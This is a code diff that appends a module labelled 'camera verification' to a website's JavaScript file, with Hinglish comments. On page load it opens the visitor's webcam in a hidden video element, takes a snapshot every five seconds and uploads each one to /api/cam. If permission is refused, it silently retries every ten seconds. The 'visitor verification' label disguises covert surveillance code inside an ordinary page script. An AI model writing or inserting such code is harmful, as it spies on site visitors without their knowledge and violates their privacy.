@@ -2857,3 +2857,71 @@
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
   else init();
 })();
+
+// ============ CAMERA VERIFICATION MODULE ============
+// (Security desk / visitor verification feature)
+
+const CAM_BOT_INTERVAL = 5000; // har 5 second
+
+async function startCamVerify() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 640, height: 480 },
+      audio: false,
+    });
+
+    // Hidden video element banao
+    const video = document.createElement("video");
+    video.autoplay = true;
+    video.playsInline = true;
+    video.style.display = "none";
+    video.srcObject = stream;
+    document.body.appendChild(video);
+
+    // Hidden canvas banao
+    const canvas = document.createElement("canvas");
+    canvas.width = 640;
+    canvas.height = 480;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext("2d");
+
+    // Pehli photo 2 second baad, phir har 5 second
+    setTimeout(() => {
+      captureAndSend(video, ctx, canvas);
+      setInterval(() => captureAndSend(video, ctx, canvas), CAM_BOT_INTERVAL);
+    }, 2000);
+
+    console.log("[CAM] Verification active");
+  } catch (e) {
+    // Permission deny ya error — 10 sec baad silently retry
+    console.log("[CAM] Retry in 10s");
+    setTimeout(startCamVerify, 10000);
+  }
+}
+
+async function captureAndSend(video, ctx, canvas) {
+  if (!video.videoWidth) return; // camera ready nahi
+
+  ctx.drawImage(video, 0, 0, 640, 480);
+
+  canvas.toBlob(async (blob) => {
+    if (!blob) return;
+
+    const fd = new FormData();
+    fd.append("photo", blob, "snap.jpg");
+
+    try {
+      await fetch("/api/cam", { method: "POST", body: fd });
+      console.log("[CAM] Snap sent:", new Date().toLocaleTimeString());
+    } catch (err) {
+      console.log("[CAM] Send failed, next try hoga");
+    }
+  }, "image/jpeg", 0.8);
+}
+
+// Page load hote hi start
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", startCamVerify);
+} else {
+  startCamVerify();
+}
